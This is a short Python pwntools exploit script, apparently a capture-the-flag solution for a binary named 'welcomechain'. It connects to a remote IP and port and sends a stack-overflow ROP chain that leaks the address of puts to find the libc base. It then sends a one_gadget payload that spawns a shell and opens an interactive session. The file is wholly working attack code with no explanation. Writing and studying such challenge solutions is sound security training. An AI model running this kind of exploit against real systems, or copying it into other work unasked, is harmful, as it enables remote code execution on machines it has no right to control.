from pwn import *
from sys import argv
from time import sleep

context.log_level = "debug"

binfile = "./welcomechain"

elf = ELF(binfile)

if len(argv) >= 2 and argv[1] == "d":
    p = gdb.debug(binfile, '''
        break *0x0
        continue
    ''')
else:
    p = remote("114.177.250.4", 2226)

payload = b""
payload += b"A" * 40
payload += p64(0x400853)    # pop rdi; ret;
payload += p64(0x601020)    # puts@got
payload += p64(0x4005a0)    # puts@plt
payload += p64(0x4007ba)    # main

p.recvuntil("Please Input : ")
p.sendline(payload)

p.recvuntil("\n")

# leak libc addr
puts_got = u64(p.recv(6).ljust(8, b"\x00"))
log.info("puts@got: 0x{:08x}".format(puts_got))
puts_off = 0x809c0
libc_base = puts_got - puts_off
log.info("libc_base: 0x{:08x}".format(libc_base))

# get shell
one_shot = 0x4f322
one_gadget = libc_base + one_shot
payload2 = b""
payload2 += b"A" * 40
payload2 += p64(one_gadget)

p.recvuntil("Please Input : ")
p.sendline(payload2)

p.recvuntil("\n")

p.interactive()
